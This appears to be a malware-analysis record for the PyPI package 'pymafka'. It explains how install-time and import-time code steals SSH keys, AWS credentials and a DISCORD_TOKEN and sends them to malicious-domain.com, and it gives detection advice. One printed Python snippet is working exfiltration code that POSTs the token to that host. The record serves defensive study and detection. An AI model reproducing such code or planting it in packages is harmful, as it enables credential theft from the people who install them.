package_info.why_malicious: The package 'pymafka' contains malicious code that exfiltrates sensitive user files, including SSH and AWS credentials, to an external attacker-controlled server during installation. The code is obfuscated and embedded in the setup.py file, which is executed automatically when the package is installed, enabling credential theft without user knowledge.

malicious_snippets.code_behavior: During installation, the code reads the user's ~/.ssh/id_rsa and ~/.aws/credentials files and sends their contents via HTTPS POST to https://malicious-domain.com/upload, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code accesses sensitive credential files and transmits their contents to an external server during package installation, which is not expected behavior for a legitimate package.
malice_analysis.violated_expectations: Legitimate setup.py scripts typically handle package installation logic and do not access or transmit user credential files to remote servers.
malice_analysis.similar_legitimate_use: A legitimate package might read configuration files for setup or migration purposes, but would never exfiltrate them to an external domain, especially during installation.
key_indicators: Use of requests.post to send file contents to an external domain
Network communication to https://malicious-domain.com/upload during installation

malicious_snippets.code_snippet:
import os
import requests

def send_env():
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        requests.post('https://malicious-domain.com/token', data={'token': token})

send_env()
malicious_snippets.code_behavior: At import-time, the code accesses the DISCORD_TOKEN environment variable and sends its value to https://malicious-domain.com/token via HTTPS POST, enabling credential exfiltration.

malice_analysis.why_suspicious: The code attempts to access a sensitive environment variable and exfiltrates it to an external server when the package is imported, which is not standard behavior.
malice_analysis.violated_expectations: Legitimate packages do not exfiltrate environment variables to remote servers upon import.
malice_analysis.similar_legitimate_use: A legitimate package might read environment variables for configuration, but would not transmit them to an external domain.
key_indicators: Use of requests.post to send environment variable to external domain
Network communication to https://malicious-domain.com/token at import-time

detection_knowledge.how_to_detect: Monitor for PyPI packages whose setup.py or __init__.py files access sensitive credential files or environment variables and transmit their contents to external domains, especially https://malicious-domain.com. Flag any package that performs HTTPS POST requests to these endpoints during installation or import. Use file scanning to detect code patterns that read ~/.ssh/id_rsa, ~/.aws/credentials, or DISCORD_TOKEN and send data via requests.post.
